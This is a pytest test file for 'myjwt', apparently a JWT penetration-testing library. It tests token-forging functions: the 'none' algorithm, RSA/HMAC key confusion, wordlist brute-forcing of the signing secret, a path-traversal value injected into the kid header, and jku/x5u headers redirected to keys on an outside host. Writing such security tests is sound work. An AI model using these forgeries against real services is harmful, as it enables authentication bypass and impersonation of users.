"""Test"""

import os
from typing import Any

import OpenSSL
import pytest

from myjwt.Exception import InvalidJWT
from myjwt.utils import HEADER, PAYLOAD, SIGNATURE, create_crt, jwt_to_json
from myjwt.vulnerabilities import (
    bruteforce_wordlist,
    confusion_rsa_hmac,
    inject_sql_kid,
    jku_vulnerability,
    none_vulnerability,
    print_decoded,
    send_jwt_to_url,
    x5u_vulnerability,
)

jwt = (
    "eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJsb2dpbiI6ImEifQ.Fjziy6GSQpP9tQRyko5APZjdymkQ8EJGOa"
    "-A2JQ6xcAVucXRhZbdBbAM2DG8io_brP_ROAqYaNlvRVsztXoPHFz_e7D2K0q6f02RXeRwZJGOhy0K"
    "-Oj9Z1UmFJWqVpAAafN75w7OKoSRh6BtQfH8XDleqwpVoywCuWFdYrSbqBoVskRQkp8H-HUC5XmN5om4"
    "-NdiQkiKa7OFQ6Hoklclz9_WD5rc"
    "-HWJp3rJW4EIHzOPfs1GuDuhtIRu0uuRYp4vvzLZcVm0BhlK9e_fmFcbsTz3MwVHIeFEIx2NjQdhE"
    "-CefQ4tNg6Rr6OtgGExToUfD0i0mAoAhTcvmoyO6c2paQ"
)
jwt_bruteforce = (
    "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjpudWxsfQ" ".Tr0VvdP6rVBGBGuI_luxGCOaz6BbhC6IxRTlKOW8UjM"
)
jwt_kid = (
    "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiIsImtpZCI6ImtleTEifQ.eyJ1c2VyIjpudWxsfQ"
    ".2B9ZKzJ3FeJ9yoNLDGKgcxOuo05PwDRzFQ_34CrGteQ"
)
jwt_jku = (
    "eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsImprdSI6Imh0dHA6Ly9sb2NhbGhvc3Q6ODA4MCJ9.eyJ1c2VyIjoiYSJ9"
    ".e1oZ73Q95aYPcRfulEY--beuGEV2tE1W_FGHtH1ZlevC76lBVqbdM5PY1v6quuJWRtNLwqDbUdydAH4lubgE0pwix-A7LqcD-b"
    "-0mNQkt9jXqBYCYBsZtGnvBFB9qHoK_CI39qLku1rOWkcEOcJYMSJFfxipImBb_AwoiXv"
    "-wmnpchTOAY_PFOtXVXKHkoGQtEaMKfnRBXHAgyEAcqHCqvljWuMmdKVpyGNVaQBnKCEKkGyYLpdpL2UIZ3XNYy96JcGpm6LHvIXm6r"
    "EOkWoJl2j_07xVsM2S__QzllRw_qezS5rzuYlRz-0j0nP_S5gSRcdrR4yNtSO3ivue5mR-RQ"
)
jwt_x5u = (
    "eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsIng1dSI6Imh0dHA6Ly90ZXN0LmNvbSJ9.eyJ1c2VyIjoiaGFja2VyIn0.Z57BGf-BW"
    "WGCYGRST3PstC7dqFVxLpYh8D9iy6z8_tpz8vIESa5IdLt3hkM8ysB0IjrkWbgNMYTaP7YiGpHG7MhF_IAc_q8HOilMtvrVTyJ0EpE3uJ"
    "okXZSh_hhU5ay2K8H743AG_5x7coAf7ZsNe_rnSuDN6iV_oXo31H2ga9VMk2BLgvqFLYgIYVETeQbcSx4M2rxiH20VbqO4dwzYDedYkD"
    "AHKGHUAI0eXJoJ7Sq3sDrjZ9_THTiHSwQQYFnlIbIcFKuANdExuhG-tmIhfa6-8Zu_RELLL6UzgL2G-yu021B_Hm9YmwuXewtDktXKY"
    "uWofo-PVFUUWVSEw7gIAw"
)
key = "pentesterlab"
public_path = "./examples/05-rsa-hmac-confusion/public.pem"
password_path = "./wordlist/common_pass.txt"
signature = "KJDuTWSj9wa3NL3j1u2HOijvgu-oO9tBjKGxjo_qdXQ"
kid_injection = "../../../../../../dev/null"


def test_none_vulnerability() -> None:
    """
    Test none_vulnerability method in vulnerabilities.py
    """
    with pytest.raises(InvalidJWT):
        none_vulnerability("")

    new_jwt = none_vulnerability(jwt)
    jwt_json = jwt_to_json(jwt)
    new_jwt_json = jwt_to_json(new_jwt)

    assert jwt_json[PAYLOAD] == new_jwt_json[PAYLOAD]
    assert new_jwt_json[HEADER]["alg"] == "none"
    assert new_jwt_json[SIGNATURE] == ""


def test_confusion_rsa_hmac() -> None:
    """
    Test confusion_rsa_hmac method in vulnerabilities.py
    """
    with pytest.raises(InvalidJWT):
        confusion_rsa_hmac("", public_path)

    new_jwt = confusion_rsa_hmac(jwt, public_path)
    jwt_json = jwt_to_json(jwt)
    new_jwt_json = jwt_to_json(new_jwt)

    assert jwt_json[PAYLOAD] == new_jwt_json[PAYLOAD]
    assert new_jwt_json[HEADER]["alg"] == "HS256"
    assert new_jwt_json[SIGNATURE] == signature


def test_bruteforce_wordlist() -> None:
    """
    Test bruteforce_wordlist method in vulnerabilities.py
    """
    with pytest.raises(InvalidJWT):
        bruteforce_wordlist("", password_path)

    new_key = bruteforce_wordlist(jwt_bruteforce, password_path)
    assert new_key == key

    new_key = bruteforce_wordlist(jwt_bruteforce, "./wordlist/empty.txt")
    assert new_key == ""


def test_inject_sql_kid() -> None:
    """
    Test inject_sql_kid method in vulnerabilities.py
    """
    with pytest.raises(InvalidJWT):
        inject_sql_kid("", kid_injection)

    jwt = inject_sql_kid(jwt_kid, kid_injection)
    assert jwt_to_json(jwt)[HEADER]["kid"] == kid_injection


def test_print_decoded() -> None:
    """
    Test print_decoded method in vulnerabilities.py
    """
    with pytest.raises(InvalidJWT):
        print_decoded("")
    print_decoded(jwt_bruteforce)


def test_send_jwt_to_url(requests_mock: Any) -> None:
    """
    Test send_jwt_to_url method in vulnerabilities.py
    """
    status_code = 200
    requests_mock.get(
        "http://localhost:8080",
        json={},
        status_code=status_code,
    )

    response = send_jwt_to_url(
        "http://localhost:8080",
        "GET",
        {"data": "data"},
        {"cookie": "cookie"},
        "test",
    )
    assert response.request.method == "GET"
    assert response.request.json() == {"data": "data"}  # type: ignore

    status_code = 200
    requests_mock.post(
        "http://localhost:8080",
        json={},
        status_code=status_code,
    )
    response = send_jwt_to_url(
        "http://localhost:8080",
        "POST",
        {"data": "data"},
        {"cookie": "cookie"},
        "test",
    )
    assert response.request.method == "POST"
    assert response.request.json() == {"data": "data"}  # type: ignore
    assert response.request.headers["Authorization"] == "Bearer test"


def test_jku_vulnerability(requests_mock: Any) -> None:
    """
    Test jku_vulnerability method in vulnerabilities.py
    """
    with pytest.raises(InvalidJWT):
        jku_vulnerability("", "http://test.com")

    with pytest.raises(InvalidJWT):
        jku_vulnerability(jwt_bruteforce, "http://test.com")

    status_code = 200
    requests_mock.get(
        "http://localhost:8080",
        json={
            "keys": [
                {
                    "kty": "RSA",
                    "use": "sig",
                    "kid": "xxxxxxxxx",
                    "n": "oTtAXRgdJ6Pu0jr3hK3opCF5uqKWKbm4KkqIiDJSEsQ4PnAz14P_aJnfnsQwgchFGN95cfCO7euC8HjT"
                    "-u5WHHDn08GQ7ot6Gq6j-fbwMdRWjLC74XqQ0JNDHRJoM4bbj4i8FaBdYKvKmnJ8eSeEjA0YrG8KuTOPbLsgl"
                    "ADUubNw9kggRIvj6au88dnBJ9HeZ27QVVFaIllZpMITtocuPkOKd8bHzkZzKN4HJtM0hgzOjeyCfqZxh1V8LybliWD"
                    "XYivUqmvrzchzwXTAQPJBBfYo9BO6D4Neui8rGbc49OBCnHLCWtPH7m7xp3cz-PbVnLhRczzsQE_3escvTF0FGw",
                    "e": "AQAB",
                    "alg": "RS256",
                },
            ],
        },
        status_code=status_code,
    )
    jwt = jku_vulnerability(jwt_jku, "http://test.com")
    jwt_json = jwt_to_json(jwt)
    assert "jku" in jwt_json[HEADER]
    assert os.path.exists("jwk-python.json")
    assert jwt_json[HEADER]["jku"] == "http://test.com/jwk-python.json"

    jwt = jku_vulnerability(jwt_jku, "http://test.com", file="test")
    jwt_json = jwt_to_json(jwt)
    assert "jku" in jwt_json[HEADER]
    assert os.path.exists("test.json")
    assert jwt_json[HEADER]["jku"] == "http://test.com/test.json"

    privatekey = OpenSSL.crypto.PKey()
    privatekey.generate_key(OpenSSL.crypto.TYPE_RSA, 4096)

    with open("private.pem", "w") as f:
        f.write(
            OpenSSL.crypto.dump_privatekey(
                OpenSSL.crypto.FILETYPE_PEM,
                privatekey,
            ).decode(),
        )

    jku_vulnerability(
        jwt_jku,
        "http://test.com",
        file="test",
        pem="private.pem",
    )
    assert os.path.exists("private.pem")


def test_x5u_vulnerability(requests_mock: Any) -> None:
    """
    Test x5u_vulnerability method in vulnerabilities.py
    """
    with pytest.raises(InvalidJWT):
        x5u_vulnerability("", url="http://test.com")

    with pytest.raises(InvalidJWT):
        x5u_vulnerability(jwt_bruteforce, url="http://test.com")

    status_code = 200
    requests_mock.get(
        "http://test.com",
        json={
            "keys": [
                {
                    "kty": "RSA",
                    "use": "sig",
                    "kid": "xxxxxxxxx",
                    "n": "oTtAXRgdJ6Pu0jr3hK3opCF5uqKWKbm4KkqIiDJSEsQ4PnAz14P_aJnfnsQwgchFGN95cfCO7euC8HjT"
                    "-u5WHHDn08GQ7ot6Gq6j-fbwMdRWjLC74XqQ0JNDHRJoM4bbj4i8FaBdYKvKmnJ8eSeEjA0YrG8KuTOPbLsgl"
                    "ADUubNw9kggRIvj6au88dnBJ9HeZ27QVVFaIllZpMITtocuPkOKd8bHzkZzKN4HJtM0hgzOjeyCfqZxh1V8LybliWD"
                    "XYivUqmvrzchzwXTAQPJBBfYo9BO6D4Neui8rGbc49OBCnHLCWtPH7m7xp3cz-PbVnLhRczzsQE_3escvTF0FGw",
                    "e": "AQAB",
                    "alg": "RS256",
                },
            ],
        },
        status_code=status_code,
    )
    jwt = x5u_vulnerability(
        jwt_x5u,
        url="http://test.com",
    )
    jwt_json = jwt_to_json(jwt)
    assert "x5u" in jwt_json[HEADER]
    assert os.path.exists("jwks_with_x5c.json")
    assert jwt_json[HEADER]["x5u"] == "http://test.com/jwks_with_x5c.json"
    create_crt()

    x5u_vulnerability(
        jwt_x5u,
        url="http://test.com",
        crt="selfsigned.crt",
        pem="private.pem",
    )
    assert os.path.exists("private.pem")
    assert os.path.exists("selfsigned.crt")

    jwt = x5u_vulnerability(
        jwt_x5u,
        url="http://test.com",
        file="test_x5u_vulnerability",
    )
    jwt_json = jwt_to_json(jwt)
    assert "x5u" in jwt_json[HEADER]
    assert os.path.exists("test_x5u_vulnerability.json")
    assert jwt_json[HEADER]["x5u"] == "http://test.com/test_x5u_vulnerability.json"
